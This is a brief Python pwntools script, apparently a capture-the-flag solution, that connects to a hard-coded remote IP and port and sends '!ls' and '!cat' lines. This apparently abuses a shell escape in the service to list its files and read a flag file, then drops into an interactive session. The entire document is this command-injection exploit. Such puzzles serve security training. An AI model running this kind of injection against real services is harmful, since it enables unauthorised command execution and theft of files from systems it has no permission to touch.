from pwn import *
sh = remote("128.199.104.41", 24064)

p="!ls"
sh.sendline(p)
p="!cat wkwkw_ini_flagnya"
sh.sendline(p)

sh.interactive()